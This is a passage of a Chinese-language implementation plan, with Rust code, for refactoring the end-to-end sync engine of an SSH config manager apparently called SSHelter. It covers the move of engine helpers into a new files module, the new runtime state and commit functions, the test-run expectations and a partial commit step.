- [ ] **Step 6: `src-tauri/src/sync/engine.rs` 的測試**

v1 引擎的測試裡,搬到 `files` 的 helper 測試一併搬走(它們在 `files.rs` 的測試裡,含 B2 最終修正後的 `managed_file_may_not_contain_forbidden_directives` 與 `managed_file_may_not_contain_values_ssh_would_hand_to_a_shell_or_invisible_characters`,涵蓋範圍不變)。

`src-tauri/src/sync/engine.rs`:把

```rust
mod tests {
    use super::*;
    use crate::config::parser::parse_file;
    use crate::sync::record::Envelope;
```

換成:

```rust
mod tests {
    use super::*;
    use crate::sync::record::Envelope;
```

`src-tauri/src/sync/engine.rs`:刪除從下面這段開始

```rust
    #[test]
    fn effects_are_applied_in_order_and_report_whether_anything_changed() {
```

到下面這段為止的整段程式碼(含這兩段本身,共 104 行):

```rust
        assert!(!engine_writing());
    }

```

`src-tauri/src/sync/engine.rs`:刪除從下面這段開始

```rust
    #[test]
    fn in_memory_items_must_match_the_disk_bytes_exactly() {
```

到下面這段為止的整段程式碼(含這兩段本身,共 35 行):

```rust
        assert!(!memory_matches_disk(&file), "an unreadable file never counts as matching");
    }

```

- [ ] **Step 7: 更新 `src-tauri/src/sync/mod.rs`**

把 `src-tauri/src/sync/mod.rs` 整個換成:

```rust
//! Sync chain: Brave 式免帳號端對端同步。各子模組單一責任、皆可單元測試:
//! - `crypto`: 助記詞、金鑰派生、記錄加密
//! - `record`: 記錄模型與 LWW 合併(Task 2)
//! - `hosts_file`: 受管同步檔的區塊操作(Task 3)
//! - `planner`: 本機變更偵測(Task 1)
//! - `state`: 本機同步狀態持久化(Task 4)
//! - `relay`: 中繼 HTTP client(Task 5)
//! - `reconcile`: 一輪同步的三段純函式(plan_local → pull_merge → push_dirty)
//! - `engine`: 背景同步執行緒、`SyncCore`、存檔當下規劃、套用+發布交易、Tauri commands
//! - `space_files`: Sync v2 的 space 檔命名、Include 清單順序與建立 / 移除 / 改名的順序規則
//! - `approval`: Sync v2 危險設定的核准簽章
//! - `state_v2`: Sync v2 的本機狀態(`version: 2`)與 v1 狀態檔的偵測
//! - `merge`: Sync v2 帳戶與 space 區段的本機 diff、合併、上傳(純函式)
//! - `fake_relay`(只在測試):記憶體假 relay
//! - `dto`: Sync v2 給前端的事件與狀態形狀
//! - `runtime`: Sync v2 的 `SyncCore` 與局部提交
//! - `env`: Sync v2 引擎與外界的邊界(keychain、relay、事件、時鐘)
//! - `files`: Sync v2 space 檔的準備、讀取、套用 + 發布交易、存檔 hook
//! - `testkit`(只在測試):測試裝置

pub mod approval;
pub mod crypto;
pub mod dto;
pub mod engine;
pub mod env;
#[cfg(test)]
pub mod fake_relay;
pub mod files;
pub mod hosts_file;
pub mod merge;
pub mod migrate;
pub mod planner;
pub mod reconcile;
pub mod record;
pub mod relay;
pub mod runtime;
pub mod space_files;
pub mod state;
pub mod state_v2;
#[cfg(test)]
pub mod testkit;
```

- [ ] **Step 8: 跑測試確認失敗**

Run: `cd src-tauri && cargo test -- --skip secrets::tests::round_trip_set_get_delete --skip askpass::tests::env_secret_takes_priority_over_keychain`
Expected: FAIL —— 編譯錯誤(測試用到的實作還不存在),例如:

```text
error[E0432]: unresolved import `crate::sync::runtime::SyncRuntime`
--> src/sync/env.rs:14:5
```

- [ ] **Step 9: 實作 `src-tauri/src/sync/runtime.rs`**

`src-tauri/src/sync/runtime.rs`:在 `use` 區之後、`#[cfg(test)]` 之前加入:

```rust
/// 被搶先(generation 變了)的輪次或提交:不是錯誤,呼叫端丟棄本輪。
pub const SUPERSEDED: &str = "sync round superseded by a newer sync state";
/// v1 升級完成之前(`SyncCore::legacy`)不寫狀態檔、不接受會改狀態的命令:磁碟上還是 v1 的狀態檔。
pub const UPGRADING_MESSAGE: &str = "SSHelter is upgrading sync on this device; try again in a moment";

/// generation / 狀態 / 金鑰永遠一起快照、一起替換。
/// - `account_keys`:由 keychain 的同步碼推導(`derive_account`);space 的金鑰每次從帳戶的 `spacekey` 密文解開,不另存。
/// - `legacy`:啟動時讀到的 v1 狀態,等背景執行緒做 v1 升級(spec §7.6);升級完成前 `state` 是給 UI 看的 v2 外殼。
/// - `unsaved`:記憶體裡的狀態還沒寫成功;下一輪在任何網路操作前先重存(同 v1)。
/// - `save_blocked`:啟動時狀態檔讀不到(I/O)或別的行程持有同步鎖:這個 session 一律不寫狀態(同 v1)。
/// - `conflict_streak`:連續幾輪以推送衝突收尾;`failed_rounds`:連續幾輪被限流或 relay 回 `5xx`(退避,spec §6.4);
///   `batch_failures`:連續幾次批次查詢回 `5xx`(第 2 次起改逐條查詢,一條壞掉的 chain 不能擋住其他的)。
/// - `relay_checked`:這個行程查過 `GET /v1/info` 的 relay URL(spec §6.4:啟動時與 URL 改變時各查一次)。
/// - `rounds`:輪數;舊版 relay 沒有批次查詢時,space 每 3 輪才查一次(spec §6.4)。
#[derive(Default)]
pub struct SyncCore {
    pub generation: u64,
    pub state: Option<SyncStateV2>,
    pub account_keys: Option<ChainKeys>,
    pub legacy: Option<LegacyState>,
    pub unsaved: bool,
    pub save_blocked: Option<String>,
    pub conflict_streak: u32,
    pub failed_rounds: u32,
    pub batch_failures: u32,
    pub relay_checked: Option<String>,
    pub rounds: u64,
}

/// Tauri 管理的同步執行期狀態(`AppState::sync`)。`lifecycle`:建立 / 加入 / 離開帳戶、改 relay URL、更換同步碼
/// 全程互斥(含網路與 keychain);`syncing`:同一時間只跑一輪。`focused` / `last_activity_ms`:視窗在前景、最近一次
/// 操作的時間 —— 決定輪詢間隔(`relay::next_poll_delay`)。
#[derive(Default)]
pub struct SyncRuntime {
    pub core: Mutex<SyncCore>,
    pub lifecycle: Mutex<()>,
    pub syncing: AtomicBool,
    pub focused: AtomicBool,
    pub last_activity_ms: AtomicU64,
}

impl SyncRuntime {
    /// 使用者在 app 裡做了事(存檔、Sync 命令):接下來幾分鐘以一般間隔輪詢。
    pub fn note_activity(&self, now_ms: u64) {
        self.last_activity_ms.fetch_max(now_ms, Ordering::SeqCst);
    }

    /// 視窗到前景 / 離開前景。回到前景也算一次操作。
    pub fn set_focused(&self, focused: bool, now_ms: u64) {
        self.focused.store(focused, Ordering::SeqCst);
        if focused {
            self.note_activity(now_ms);
        }
    }
}

pub fn superseded() -> AppError {
    AppError::Other(SUPERSEDED.to_string())
}

pub fn is_superseded(e: &AppError) -> bool {
    matches!(e, AppError::Other(m) if m == SUPERSEDED)
}

/// 持久化 core 裡的狀態(呼叫端持有 core 鎖)並維護 `unsaved`。`save_blocked` 時一律拒絕、不標 `unsaved`。
pub fn save_core(core: &mut SyncCore, state_path: &Path) -> Result<(), AppError> {
    if let Some(reason) = &core.save_blocked {
        return Err(AppError::Other(reason.clone()));
    }
    if core.legacy.is_some() {
        return Err(AppError::Other(UPGRADING_MESSAGE.to_string()));
    }
    let result = match core.state.as_ref() {
        Some(s) => state_v2::save(state_path, s),
        None => Ok(()),
    };
    core.unsaved = result.is_err();
    result
}

/// 局部提交:在 core 鎖內比 generation,對**最新**的狀態套用 `f`(只改呼叫端負責的區段),然後持久化。generation
/// 變了 → `SUPERSEDED`,什麼都不改。`f` 回 Err 時不存檔。
pub fn commit<T>(env: &SyncEnv, generation: u64, f: impl FnOnce(&mut SyncStateV2) -> Result<T, AppError>) -> Result<T, AppError> {
    let mut core = env.runtime.core.lock().unwrap();
    if core.generation != generation {
        return Err(superseded());
    }
    let s = core.state.as_mut().ok_or_else(superseded)?;
    let out = f(s)?;
    save_core(&mut core, &env.state_path)?;
    Ok(out)
}

/// 命令對狀態的修改:先拿 doc 鎖(與套用 + 發布的交易互斥,順序 doc → core),在同一個 core 臨界區「改狀態 + 換
/// generation + 持久化」。`f` 回錯誤(命令被拒絕)時什麼都不改、不換 generation —— 所以 `f` 必須在任何修改之前就
/// 決定要不要拒絕。`save_blocked` 時直接拒絕。
pub fn mutate<T>(env: &SyncEnv, f: impl FnOnce(&mut SyncStateV2) -> Result<T, AppError>) -> Result<T, AppError> {
    let _doc = env.doc.lock().unwrap();
    let mut core = env.runtime.core.lock().unwrap();
    if let Some(reason) = &core.save_blocked {
        return Err(AppError::Other(reason.clone()));
    }
    if core.legacy.is_some() {
        return Err(AppError::Other(UPGRADING_MESSAGE.to_string()));
    }
    let s = core.state.as_mut().ok_or_else(|| AppError::Other("sync is not initialized".to_string()))?;
    let out = f(s)?;
    core.generation += 1;
    save_core(&mut core, &env.state_path)?;
    Ok(out)
}

/// 狀態的唯讀快照。
pub fn snapshot(env: &SyncEnv) -> Option<SyncStateV2> {
    env.runtime.core.lock().unwrap().state.clone()
}
```

- [ ] **Step 10: 實作 `src-tauri/src/sync/files.rs`**

重點:`apply_and_commit_space` 在 doc 鎖內比對指紋、`EngineWrite` 標記引擎自己的寫入、`persist_file` 不持有 core 鎖;只有在 core 鎖內 generation 相符時才換掉**這個 space** 的區段(cursor、records、pending),絕不換整份狀態;`rename_blocked` 由帳戶那一步維護,換區段時保留最新的。

`src-tauri/src/sync/files.rs`:在 `use` 區之後、`#[cfg(test)]` 之前加入:

```rust
thread_local! {
    static ENGINE_WRITING: Cell<bool> = const { Cell::new(false) };
}

/// 引擎自己套用遠端效果時寫 space 檔:`persist_file` → 存檔 hook 不可把這次寫入當成本機編輯(否則遠端內容會以
/// 「現在」的時間戳被當成本機修改重新上傳)。RAII:離開作用域(含 panic)就復原。
pub(crate) struct EngineWrite;

impl EngineWrite {
    pub(crate) fn begin() -> Self {
        ENGINE_WRITING.with(|w| w.set(true));
        EngineWrite
    }
}

impl Drop for EngineWrite {
    fn drop(&mut self) {
        ENGINE_WRITING.with(|w| w.set(false));
    }
}

pub(crate) fn engine_writing() -> bool {
    ENGINE_WRITING.with(|w| w.get())
}

/// 同步檔的不變式(spec §3.1/§6;Sync v2 以 space 為單位):只放具名、互不重複的 Host 區塊,且沒有 `Include` 或帶引號的
/// keyword 等 `hosts_file::Forbidden` 的每一種(另有行首的 `=`、會交給 shell 的值、看不見的字元、OpenSSH 讀法不同的
/// Host/Match 行;Sync v2 spec §4.3、§7.4)。違反時這個檔案停在讀檔階段(不 diff、不套用、不上傳),狀態列顯示要搬走/
/// 刪掉哪個區塊 —— 驗證過的遠端效果因此套用時不可能失敗。
pub fn check_managed_items(items: &[Item]) -> Result<(), AppError> {
    let mut seen = BTreeSet::new();
    for item in items {
        if let Item::Host(h) = item {
            if !hosts_file::is_syncable_block(&h.patterns) {
                return Err(AppError::Other(format!(
                    "the synced hosts file contains 'Host {}', which uses wildcard patterns; move that block to your main config",
                    h.patterns.join(" ")
                )));
            }
            if let Some(alias) = h.patterns.first() {
                if !seen.insert(alias.clone()) {
                    return Err(AppError::Other(format!(
                        "the synced hosts file defines '{alias}' more than once; remove the duplicate"
                    )));
                }
            }
        }
    }
    // 不允許的 directive(`hosts_file::Forbidden` 的每一種,從 Include、帶引號的 keyword 到 Host/Match 行;spec §4.3、§7.4):整個檔案都查,含 top-level。
    if let Some(f) = hosts_file::forbidden_directive(items) {
        return Err(AppError::Other(format!(
            "the synced hosts file contains {}, which synced hosts cannot use; move that block to your main config",
            f.describe()
        )));
    }
    Ok(())
}

/// 把效果套到區塊列表。回傳(是否改了任何東西, 套不上的 alias);壞掉的效果不中斷其他效果。
pub fn apply_effects_to_items(items: &mut Vec<Item>, effects: &[HostEffect]) -> (bool, Vec<String>) {
    let mut changed = false;
    let mut failed = Vec::new();
    for effect in effects {
        let result = match effect {
            HostEffect::Upsert { alias, text } => hosts_file::apply_host_text(items, alias, text),
            HostEffect::Delete { alias } => Ok(hosts_file::remove_host_block(items, alias)),
        };
        match result {
            Ok(c) => changed |= c,
            Err(_) => failed.push(effect.alias().to_string()),
        }
    }
    (changed, failed)
}

/// in-memory 的內容是否正是磁碟上的 bytes:用 `persist_file` 的同一個 serializer 與 `trailing_newline` 序列化後
/// 逐 byte 比對(parser 是 lossless 的,從磁碟載入或剛寫入的內容一定相等)。
pub(crate) fn items_match_disk(items: &[Item], trailing_newline: bool, disk: &[u8]) -> bool {
    serialize_items(items, trailing_newline).as_bytes() == disk
}

/// 只比指紋不夠:app 的某次寫入「先改 doc、寫檔才失敗」時,磁碟沒變、指紋照樣相符,in-memory 卻已經比磁碟新。
/// 讀不到檔一律當成不相符。
pub(crate) fn memory_matches_disk(file: &ConfigFile) -> bool {
    std::fs::read(&file.path).is_ok_and(|disk| items_match_disk(&file.items, file.trailing_newline, &disk))
}

/// `<ssh_dir>/sshelter/<file_name>`;狀態檔讀回來的檔名一律先經 `space_files::space_file_path` 驗證。
pub fn space_path(env: &SyncEnv, file_name: &str) -> Result<PathBuf, AppError> {
    space_files::space_file_path(&env.ssh_dir, file_name)
}

/// 主 config 最頂端的 Include 清單換成 `tokens`,有變才寫檔(spec §4.3)。呼叫端持有 doc 與 backed_up 鎖、**不持有**
/// core 鎖。
pub fn write_include(
    doc: &mut SshConfigDoc,
    backed_up: &mut HashSet<PathBuf>,
    retention: Option<usize>,
    tokens: &[String],
) -> Result<(), AppError> {
    if hosts_file::ensure_include(&mut doc.files[0].items, tokens) {
        persist_file(doc, 0, backed_up, retention)?;
    }
    Ok(())
}

/// 快取裡有未刪除的 host 記錄(已上傳的或還沒上傳的都算)。
fn holds_live_hosts(space: &SpaceState) -> bool {
    space.records.values().any(|l| l.record.kind == RecordKind::Host && !l.record.deleted)
}

/// space 檔不見了(以 space 為單位沿用 v1 的規則,spec §7.1):基線已建立、快取裡有未刪除的主機 → 不能做本機 diff
/// (重建出來的空檔會把每一台主機都變成刪除推給所有裝置),要從 chain 重新長出。
pub fn space_vanished(space: &SpaceState) -> bool {
    space.baseline_established && holds_live_hosts(space)
}

/// space 檔還在、卻一個 Host 區塊都沒有(被清空):同 `space_vanished`。
pub fn space_emptied(blocks: &[HostBlockText], space: &SpaceState) -> bool {
    blocks.is_empty() && space_vanished(space)
}

/// 從 chain 重新長出一個 space 檔(同 v1 `reset_hosts_for_rematerialize`):丟掉已上傳的 host 記錄、保留還沒上傳的,
/// cursor 歸零、回到基線輪。待核准與拒絕的記錄保留。
pub fn reset_space_for_rematerialize(space: &mut SpaceState) {
    space.records.retain(|_, l| l.record.kind != RecordKind::Host || l.dirty);
    space.cursor_seq = 0;
    space.baseline_established = false;
}

/// `prepare_files` 的結果。
#[derive(Debug, Default, PartialEq)]
pub struct Prepared {
    /// 整份重載了 in-memory doc:呼叫端放掉所有鎖之後通知前端(`events.applied(0)`)。
    pub reloaded: bool,
    /// space 檔不見了、已改成從 chain 重新長出的 space(已存檔、已換 generation):這一輪到此為止。
    pub rematerialized: Vec<String>,
}

/// 準備每個勾選的 space 檔(spec §4.3、§7.1)。doc 還沒載入或沒加入帳戶 → `Ok(None)`,什麼都不碰。
/// 1. 勾選的 space 檔不在就建空檔(0600,目錄 0700)—— 先建檔、再列進 Include。檔案不見了而快取裡有未刪除的主機
///    (`space_vanished`)時,**先**把那個 space 改成從 chain 重新長出、換 generation、存檔,存成功才建空檔(理由同
///    v1 `ensure_managed_loaded`:空檔一旦存在,之後就分不出「檔案不見了」和「主機都刪光了」)。
/// 2. 主 config 最頂端那一行 Include 換成目前勾選的清單(沒有勾選就移除)。
/// 3. 取消勾選做到一半(`selected` = false)的 space:已不在清單上 → 備份並刪檔,再刪掉它的狀態。
/// 4. 有勾選的 space 檔還沒載入 doc(剛建立、剛改名),或刪了檔 → 整份重載。
pub fn prepare_files(env: &SyncEnv) -> Result<Option<Prepared>, AppError> {
    let mut doc_lock = env.doc.lock().unwrap();
    let Some(doc) = doc_lock.as_mut() else { return Ok(None) };
    let mut backed_up = env.backed_up.lock().unwrap();
    let retention = env.retention();
    let spaces = match env.runtime.core.lock().unwrap().state.as_ref() {
        Some(s) if s.joined() => s.spaces.clone(),
        _ => return Ok(None),
    };
    let mut prepared = Prepared::default();
    for (id, space) in spaces.iter().filter(|(_, s)| s.selected) {
        let path = space_path(env, &space.file_name)?;
        // 只有「確定不存在」才算不見了:查不到 metadata 是錯誤,不能拿空檔蓋掉既有內容。
        if path.try_exists()? {
            continue;
        }
        if space_vanished(space) {
            let mut core = env.runtime.core.lock().unwrap();
            if let Some(s) = core.state.as_mut().and_then(|s| s.spaces.get_mut(id)) {
                reset_space_for_rematerialize(s);
            }
            core.generation += 1; // 持有 doc 鎖:在途輪次的舊快照作廢
            save_core(&mut core, &env.state_path)?;
            prepared.rematerialized.push(id.clone());
        }
        fsutil::atomic_write(&path, b"", 0o600)?;
    }
    let tokens = {
        let core = env.runtime.core.lock().unwrap();
        let s = core.state.as_ref().ok_or_else(superseded)?;
        selected_include_tokens(s.account.as_ref(), &s.spaces)?
    };
    write_include(doc, &mut backed_up, retention, &tokens)?;
    let mut removed = false;
    for (id, space) in spaces.iter().filter(|(_, s)| !s.selected) {
        space_files::remove_space_file(&env.ssh_dir, &space.file_name, || Ok(()))?;
        let mut core = env.runtime.core.lock().unwrap();
        if let Some(s) = core.state.as_mut() {
            s.spaces.remove(id);
        }
        core.generation += 1;
        save_core(&mut core, &env.state_path)?;
        removed = true;
    }
    let unloaded = spaces
        .values()
        .filter(|s| s.selected)
        .filter_map(|s| space_path(env, &s.file_name).ok())
        .any(|p| !doc.files.iter().any(|f| f.path == p));
    if unloaded || removed {
        let main = doc.files[0].path.clone();
        *doc_lock = Some(env.load_doc(&main)?);
        prepared.reloaded = true;
    }
    Ok(Some(prepared))
}

/// 一個 space 檔讀到的內容:區塊、當時的指紋(套用前要再比一次)、檔案 mtime(外部編輯的時間戳)。
#[derive(Clone, Debug)]
pub struct Gathered {
    pub blocks: Vec<HostBlockText>,
    pub fingerprint: Fingerprint,
    pub modified_ms: u64,
}

/// 每個 space 的讀檔結果:Err = 違反不變式或讀不到(訊息給狀態列)。
pub type GatherResults = BTreeMap<String, Result<Gathered, String>>;

/// 讀取每個 space 檔並檢查不變式(spec §7.1 第 2 步)。任何一個 space 檔被手改過(指紋不同)或 in-memory 內容
/// 不是磁碟上的內容,先整份重載一次。每個 space 各自回 Ok 或 Err(違反不變式或讀不到 —— 只暫停那個 space)。
/// 回傳(每個 space 的結果, 是否重載了 doc)。
pub fn gather(
    env: &SyncEnv,
    spaces: &[(String, PathBuf)],
) -> Result<(GatherResults, bool), AppError> {
    let mut doc_lock = env.doc.lock().unwrap();
    let doc = doc_lock.as_ref().ok_or_else(|| AppError::Other("no config loaded".to_string()))?;
    let stale = spaces.iter().any(|(_, path)| {
        doc.files
            .iter()
            .find(|f| &f.path == path)
            .is_some_and(|f| fsutil::has_changed(path, &f.fingerprint).unwrap_or(true) || !memory_matches_disk(f))
    });
    let mut reloaded = false;
    if stale {
        let main = doc.files[0].path.clone();
        *doc_lock = Some(env.load_doc(&main)?);
        reloaded = true;
    }
    let doc = doc_lock.as_ref().expect("just loaded");
    let mut out = BTreeMap::new();
    for (id, path) in spaces {
        let result = match doc.files.iter().find(|f| &f.path == path) {
            None => Err("the space file could not be read; make sure it is a readable text file".to_string()),
            Some(f) => match check_managed_items(&f.items) {
                Err(e) => Err(e.to_string()),
                Ok(()) => {
                    // 外部編輯的時間戳 = 檔案 mtime(整檔的近似值,同 v1);拿不到就退回現在。
                    let modified_ms = std::fs::metadata(path)
                        .and_then(|m| m.modified())
                        .ok()
                        .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
                        .map(|d| d.as_millis() as u64)
                        .unwrap_or_else(|| env.now());
                    Ok(Gathered { blocks: hosts_file::blocks_of(&f.items), fingerprint: f.fingerprint.clone(), modified_ms })
                }
            },
        };
        out.insert(id.clone(), result);
    }
    Ok((out, reloaded))
}

/// `apply_and_commit_space` 的結果。
#[derive(Debug)]
pub enum Applied {
    /// 效果已寫入(或沒有要寫的)、這個 space 的新區段已發布;`wrote` = 真的寫了檔;`save_error` = 狀態沒能寫進磁碟
    /// (`unsaved` 已標記)。檔案已經改了,所以通知照樣要做,呼叫端之後才停下。
    Committed { wrote: bool, save_error: Option<AppError> },
    /// space 檔在讀取之後變過(app 存檔、外部編輯或 `persist_file` 的 Conflict):這個 space 本輪作廢,立刻重跑。
    FileChanged,
}

/// 一個 space 的「套用 + 發布」交易(spec §7.1 第 6 步,v1 `apply_and_commit` 的語意,全有或全無):全程持有 doc
/// 鎖 —— 比 generation → 比讀取時的指紋(不論有沒有效果都比)→ 在副本上套效果 → 寫檔 → 只把**這個 space 的區段**
/// 換成 `next`(局部提交,spec §12 #8)。寫檔失敗先退回、再從磁碟重載:磁碟上若正是剛寫的內容(寫入其實已提交)就
/// 照常發布,否則本 space 作廢。通知在鎖放掉之後(`events.applied(0)`:doc 重載過)。
pub fn apply_and_commit_space(
    env: &SyncEnv,
    generation: u64,
    space_id: &str,
    path: &Path,
    gathered: &Fingerprint,
    effects: &[HostEffect],
    next: &SpaceState,
) -> Result<Applied, AppError> {
    let mut doc_lock = env.doc.lock().unwrap();
    if env.runtime.core.lock().unwrap().generation != generation {
        return Err(superseded());
    }
    let doc = doc_lock.as_mut().ok_or_else(|| AppError::Other("no config loaded".to_string()))?;
    let idx = doc
        .files
        .iter()
        .position(|f| f.path == path)
        .ok_or_else(|| AppError::Other("the space file is not loaded".to_string()))?;
    if doc.files[idx].fingerprint != *gathered
        || fsutil::has_changed(path, &doc.files[idx].fingerprint).unwrap_or(true)
        || !memory_matches_disk(&doc.files[idx])
    {
        return Ok(Applied::FileChanged);
    }
    let mut wrote = false;
    if !effects.is_empty() {
        let mut items = doc.files[idx].items.clone();
        let (changed, failed) = apply_effects_to_items(&mut items, effects);
        if !failed.is_empty() {
            // space 檔已通過不變式、遠端文字已通過 validate_host_text:走到這裡是 bug。全有或全無(只報數量)。
            return Err(AppError::Other(format!(
                "{} synced host record(s) could not be applied; nothing was changed",
                failed.len()
            )));
        }
        if changed {
            // 新建的 space 檔是空的、沒有結尾換行:第一次寫入主機時補上,檔案才是一般文字檔的樣子。
            let original_newline = doc.files[idx].trailing_newline;
            doc.files[idx].trailing_newline = original_newline || doc.files[idx].items.is_empty();
            let expected = serialize_items(&items, doc.files[idx].trailing_newline);
            let original = std::mem::replace(&mut doc.files[idx].items, items);
            let written = {
                let mut backed_up = env.backed_up.lock().unwrap();
                let retention = env.retention();
                let _engine = EngineWrite::begin();
                persist_file(doc, idx, &mut backed_up, retention)
            };
            if let Err(e) = written {
                doc.files[idx].items = original;
                doc.files[idx].trailing_newline = original_newline;
                let main = doc.files[0].path.clone();
                match env.load_doc(&main) {
                    Ok(fresh) => *doc_lock = Some(fresh),
                    Err(reload) => {
                        *doc_lock = None;
                        drop(doc_lock);
                        env.events.applied(0);
                        return Err(AppError::Other(format!("{e}; reloading the config afterwards also failed: {reload}")));
                    }
                }
                let committed = std::fs::read_to_string(path).map(|t| t == expected).unwrap_or(false);
                if !committed {
                    drop(doc_lock);
                    env.events.applied(0);
                    return match e {
                        AppError::Conflict(_) => Ok(Applied::FileChanged),
                        other => Err(other),
                    };
                }
            }
            wrote = true;
        }
    }
    // 仍持有 doc 鎖:generation 在這段期間不可能變,再比一次當防線,然後只發布這個 space 的區段。
    let save_error = {
        let mut core = env.runtime.core.lock().unwrap();
        if core.generation != generation {
            return Err(superseded());
        }
        let section = core.state.as_mut().and_then(|s| s.spaces.get_mut(space_id)).ok_or_else(superseded)?;
        // 改名被擋的記號由帳戶那一步(`spaces::reconcile_space_files`)維護,這一輪的合併結果不碰它:保留最新的,否則
        // 本輪開始時的快照會把它蓋掉、下一輪又重複提示。
        let rename_blocked = section.rename_blocked.take();
        *section = next.clone();
        section.rename_blocked = rename_blocked;
        save_core(&mut core, &env.state_path).err()
    };
    Ok(Applied::Committed { wrote, save_error })
}

/// 存檔 hook 的本體(spec §7.1「note_file_written」):app 寫完任何檔案後,呼叫端持有 doc 鎖時呼叫(鎖順序 doc →
/// core)。依路徑找出所屬的 space,在**存檔當下**把這次編輯規劃成 dirty 記錄(時間戳 = 存檔時間)、持久化,並換
/// generation 讓在途輪次的舊快照作廢。引擎自己的寫入(`EngineWrite`)、不屬於任何勾選 space 的檔案都不算。基線輪
/// 還沒跑或檔案違反不變式時不規劃(交給同步輪次),但一樣換 generation。
pub fn note_written(env: &SyncEnv, path: &Path, items: &[Item]) {
    if engine_writing() {
        return;
    }
    let now = env.now();
    env.runtime.note_activity(now);
    {
        let mut core = env.runtime.core.lock().unwrap();
        let Some(s) = core.state.as_mut().filter(|s| s.joined()) else { return };
        let Some(space_id) = s
            .spaces
            .iter()
            .find(|(_, sp)| sp.selected && space_files::space_file_path(&env.ssh_dir, &sp.file_name).is_ok_and(|p| p == path))
            .map(|(id, _)| id.clone())
        else {
            return;
        };
        let device_id = s.device_id.clone();
        let space = s.spaces.get_mut(&space_id).expect("found above");
        let planned = if space.baseline_established && check_managed_items(items).is_ok() {
            plan_hosts(space, &hosts_file::blocks_of(items), &device_id, |_| now)
        } else {
            0
        };
        core.generation += 1;
        if planned > 0 {
            if let Err(e) = save_core(&mut core, &env.state_path) {
                // 檔案已寫成功,只是同步狀態沒存下來:`unsaved` 讓下一輪在任何網路操作前先重存。
                if let Some(s) = core.state.as_mut() {
                    s.last_error = Some(format!("sync state could not be saved after a local edit: {e}"));
                }
            }
        }
    }
    env.events.wake();
}
```

- [ ] **Step 11: 修改 `src-tauri/src/config/include.rs`**

Include 的 `~` 展開抽成 `expand_token`;測試建置多一個 thread-local 的家目錄覆寫。production 行為不變。

`src-tauri/src/config/include.rs`:把

```rust
        for token in pattern_str.split_whitespace() {
            // Expand ~ and environment variables.
            let expanded = match shellexpand::full(token) {
                Ok(s) => s.into_owned(),
                Err(_) => continue,
            };

            // Resolve relative paths against the parent directory of the including file.
```

換成:

```rust
        for token in pattern_str.split_whitespace() {
            // Expand ~ and environment variables.
            let Some(expanded) = expand_token(token) else { continue };

            // Resolve relative paths against the parent directory of the including file.
```

`src-tauri/src/config/include.rs`:把

```rust

    Ok(())
}

```

換成:

```rust

    Ok(())
}

/// `~` 與環境變數展開。測試建置可以用 `with_test_home` 把 `~` 指到暫存的家目錄(thread-local):同步引擎的 Include
/// 一律寫成 `~/.ssh/sshelter/...`,測試不能因此讀到開發者真正的家目錄。
fn expand_token(token: &str) -> Option<String> {
    #[cfg(test)]
    if let Some(home) = TEST_HOME.with(|h| h.borrow().clone()) {
        if let Some(rest) = token.strip_prefix("~/") {
            return Some(home.join(rest).to_string_lossy().into_owned());
        }
    }
    shellexpand::full(token).ok().map(|s| s.into_owned())
}

#[cfg(test)]
thread_local! {
    static TEST_HOME: std::cell::RefCell<Option<PathBuf>> = const { std::cell::RefCell::new(None) };
}

/// 只給測試:在 `f` 執行期間,這個執行緒載入 config 時 `~` 指向 `home`。
#[cfg(test)]
pub(crate) fn with_test_home<T>(home: &Path, f: impl FnOnce() -> T) -> T {
    let previous = TEST_HOME.with(|h| h.replace(Some(home.to_path_buf())));
    let out = f();
    TEST_HOME.with(|h| *h.borrow_mut() = previous);
    out
}

```

- [ ] **Step 12: 修改 `src-tauri/src/sync/engine.rs`**

v1 引擎改用 `files` 的 helper:刪掉本檔的定義、加上 `use`。行為不變。

`src-tauri/src/sync/engine.rs`:把

```rust
//! 鎖順序固定:lifecycle → doc → backed_up → core。

use std::cell::Cell;
use std::collections::BTreeSet;
use std::fs::{File, OpenOptions, TryLockError};
use std::path::{Path, PathBuf};
```

換成:

```rust
//! 鎖順序固定:lifecycle → doc → backed_up → core。

use std::fs::{File, OpenOptions, TryLockError};
use std::path::{Path, PathBuf};
```

`src-tauri/src/sync/engine.rs`:把

```rust

use crate::config::commands::{load_doc_migrated, persist_file};
use crate::config::model::{ConfigFile, Item};
use crate::config::serialize::serialize_items;
use crate::error::AppError;
use crate::fsutil::{self, Fingerprint};
use crate::state::AppState;
use crate::sync::crypto::{self, ChainKeys};
```

換成:

```rust

use crate::config::commands::{load_doc_migrated, persist_file};
use crate::config::model::Item;
use crate::config::serialize::serialize_items;
use crate::error::AppError;
use crate::fsutil::{self, Fingerprint};
use crate::sync::files::{
    apply_effects_to_items, check_managed_items, engine_writing, memory_matches_disk, EngineWrite,
};
use crate::state::AppState;
use crate::sync::crypto::{self, ChainKeys};
```

`src-tauri/src/sync/engine.rs`:刪除從下面這段開始

```rust
thread_local! {
```

到下面這段為止的整段程式碼(含這兩段本身,共 25 行):

```rust
    ENGINE_WRITING.with(|w| w.get())
}

```

`src-tauri/src/sync/engine.rs`:刪除從下面這段開始

```rust
/// 受管檔的不變式(spec §3.1/§6):只放具名、互不重複的 Host 區塊,且沒有 `Include` 或帶引號的 keyword
```

到下面這段為止的整段程式碼(含這兩段本身,共 49 行):

```rust
    (changed, failed)
}

```

`src-tauri/src/sync/engine.rs`:刪除從下面這段開始

```rust
/// in-memory 的受管檔內容是否正是磁碟上的 bytes:用 `persist_file` 的同一個 serializer 與 `trailing_newline`
```

到下面這段為止的整段程式碼(含這兩段本身,共 12 行):

```rust
    std::fs::read(&file.path).is_ok_and(|disk| items_match_disk(&file.items, file.trailing_newline, &disk))
}

```

- [ ] **Step 13: 跑測試確認通過**

Run: `cd src-tauri && cargo test -- --skip secrets::tests::round_trip_set_get_delete --skip askpass::tests::env_secret_takes_priority_over_keychain`
Expected: PASS —— `test result: ok. 541 passed; 0 failed`(task 開始前 531)。數量有變的模組:`sync::dto` 2(新)、`sync::engine` 32 → 24、`sync::files` 14(新)、`sync::runtime` 2(新)。非測試建置會有一長串 `dead_code` 類的 warning(`is never used` 之類):B2 留下的,加上本計畫新增、要到 B3b Task 2 才接上的項目;B3b Task 2 之後只剩既有的 `set_host_enabled`。這是預期的,不要加 `#[allow(dead_code)]`;不得有其他種類的 warning。

- [ ] **Step 14: Commit**

只加下列路徑(`src-tauri/Cargo.lock` 的版本漂移不要 stage):

```bash
git add src-tauri/src/sync/dto.rs
git add src-tauri/src/sync/env.rs
git add src-tauri/src/sync/testkit.rs
git add src-tauri/src/sync/runtime.rs
